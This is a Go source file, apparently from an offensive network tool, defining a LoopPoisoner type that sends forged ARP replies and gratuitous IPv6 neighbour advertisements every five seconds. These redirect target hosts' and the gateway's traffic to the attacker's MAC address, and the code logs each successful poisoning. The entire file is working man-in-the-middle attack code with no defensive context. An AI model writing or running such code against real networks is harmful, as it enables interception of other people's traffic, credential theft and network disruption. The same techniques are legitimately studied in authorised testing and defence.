package arp

import (
	"context"
	"fmt"
	"net"
	"time"
)

const arpTag = "\x1b[38;5;208m[ARP]\x1b[0m"

// LoopPoisoner poisons target ARP/NDP caches using the interface MAC until ctx is cancelled.
type LoopPoisoner struct {
	Interface string
	Targets   []net.IP
	Gateway   net.IP
}

func (p *LoopPoisoner) Run(ctx context.Context) error {
	iface, err := net.InterfaceByName(p.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", p.Interface, err)
	}
	ourMAC := iface.HardwareAddr
	if len(ourMAC) != 6 {
		return fmt.Errorf("interface %s has no MAC address", p.Interface)
	}

	ourIP4, _, _ := ifaceIPv4Net(iface)
	ourIP6, _ := ifaceIPv6LinkLocal(iface)
	gwIP4 := p.Gateway.To4()

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return nil
		case <-ticker.C:
			for _, ip := range p.Targets {
				display := ip.String()
				if ip4 := ip.To4(); ip4 != nil {
					if ourIP4 == nil {
						continue
					}
					sock.Send(buildARPFrame(arpOpReply, broadcastMAC, ourMAC, ip4, broadcastMAC, ip4))
					if targetMAC, ok := resolveIPv4MAC(sock, ourMAC, ourIP4, ip4, 1500*time.Millisecond); ok {
						if gwIP4 != nil {
							sock.Send(buildARPFrame(arpOpReply, targetMAC, ourMAC, gwIP4, targetMAC, ip4))
						}
						fmt.Printf("%s Poisoned answer sent to %s\n", arpTag, display)
						fmt.Printf("%s ARP poisoning successful: %s is-at %s\n", arpTag, display, ourMAC)
					}
					continue
				}
				if ourIP6 == nil {
					continue
				}
				sock.Send(buildGratuitousNA(ourMAC, ip))
				if _, ok := resolveIPv6MAC(sock, ourMAC, ourIP6, ip, 1500*time.Millisecond); ok {
					fmt.Printf("%s Poisoned answer sent to %s\n", arpTag, display)
					fmt.Printf("%s NDP poisoning successful: %s is-at %s\n", arpTag, display, ourMAC)
				}
			}
		}
	}
}
